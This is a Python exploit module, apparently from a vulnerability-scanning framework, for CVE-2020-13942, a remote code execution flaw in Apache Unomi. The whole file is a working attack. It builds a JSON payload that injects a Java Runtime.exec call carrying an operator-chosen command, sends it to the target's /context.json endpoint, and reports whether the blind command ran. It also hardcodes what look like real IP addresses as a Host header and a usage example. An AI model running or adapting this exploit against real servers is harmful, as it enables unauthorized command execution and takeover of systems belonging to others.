import requests,json
from ClassCongregation import _urlparse,PocType_,verify
from operator import methodcaller
from requests_toolbelt.utils import dump
################
##--ApacheSolr--##
#CVE-2020-13942 无回显的命令执行, < 1.5.2, apache unomi remote code execution
################
CMD = verify.CMD
VULN = verify.VULN
TIMEOUT = verify.TIMEOUT
class ApacheUnomi():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {  "parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ], "sessionId": "test-demo-session-id_anystr" }'''

    def cve_2020_13942(self):
        self.pocname = "Apache Unomi: CVE-2020-13942"
        self.method = "post"
        self.rawdata = "null"
        self.info = PocType_.rce()
        self.r = "PoCWating"
        self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", self.CMD)
        self.headers = {
            'Host': '34.87.38.169:8181',
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/json'
        }
        try:
            self.request = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
                                         timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            self.rep = list(json.loads(self.request.text)["trackedConditions"])[0]["parameterValues"]["pagePath"]
            if VULN == 'False':
                if r"/tracker/" in self.rep:
                    self.r = "PoCSuSpEct"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.r = "Command Executed Successfully (But No Echo)"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: https://49.233.64.75:9443
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Unomi      | CVE-2020-13942   |  Y  |  Y  | < 1.5.2, apache unomi remote code execution                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    ExpApacheUnomi = ApacheUnomi(_urlparse(kwargs['url']), CMD)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpApacheUnomi, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(ApacheUnomi):
            if not func.startswith("__"):
                methodcaller(func)(ExpApacheUnomi)

